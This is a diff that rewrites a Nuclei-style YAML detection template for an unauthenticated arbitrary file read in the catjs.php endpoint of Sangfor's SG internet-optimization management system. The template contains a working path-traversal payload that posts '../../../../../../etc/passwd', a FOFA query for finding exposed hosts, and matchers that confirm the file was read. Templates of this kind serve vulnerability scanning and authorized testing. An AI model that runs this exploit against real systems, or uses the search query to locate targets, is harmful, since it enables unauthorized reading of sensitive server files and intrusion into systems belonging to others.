@@ -1,33 +1,34 @@
-# 来源: afrog（转换自 afrog/xray 表达式 POC）
+id: sangfor-sg-catjs-fileread
+
+info:
+  name: 深信服 SG 上网优化管理系统 catjs.php 任意文件读取
+  author: zan8in
+  severity: high
+  description: |
+    深信服 SG 上网优化管理系统 catjs.php 接口存在任意文件读取，未授权可获取服务器敏感文件。
+  reference:
+    - https://mp.weixin.qq.com/s/t5DF-O5uW1Fgnc9kkAlPiQ
+  metadata:
+    max-request: 1
+    fofa-query: title="SANGFOR上网优化管理"
+  tags: sangfor,lfi,fileread
+
 http:
-  - body: '["../../../../../../etc/passwd"]'
-    headers:
-      Sec-Fetch-Dest: document
-      Sec-Fetch-Mode: navigate
-      Sec-Fetch-Site: none
+  - raw:
+      - |
+        POST /php/catjs.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        ["../../../../../../etc/passwd"]
+
+    matchers-condition: and
     matchers:
-      - type: status
-        status:
-          - 200
       - type: word
         part: body
         words:
           - '// FILE: ../../../../../../etc/passwd'
-        condition: and
-    method: POST
-    path:
-      - '{{BaseURL}}/php/catjs.php'
-id: sangfor-sg-catjs-fileread
-info:
-  author: zan8in
-  description: |-
-    深信服 SG上网优化管理系统 catjs.php 存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器上的敏感文件
-    FOFA: title=="SANGFOR上网优化管理"
-  metadata:
-    argus-execution-class: detection
-    argus-import-license: MIT License
-    argus-import-source: afrog
-    argus-risk-level: high
-  name: 深信服 SG上网优化管理系统 catjs.php 任意文件读取
-  severity: high
-  tags: sangfor,fileread,argus-import
+
+      - type: status
+        status:
+          - 200
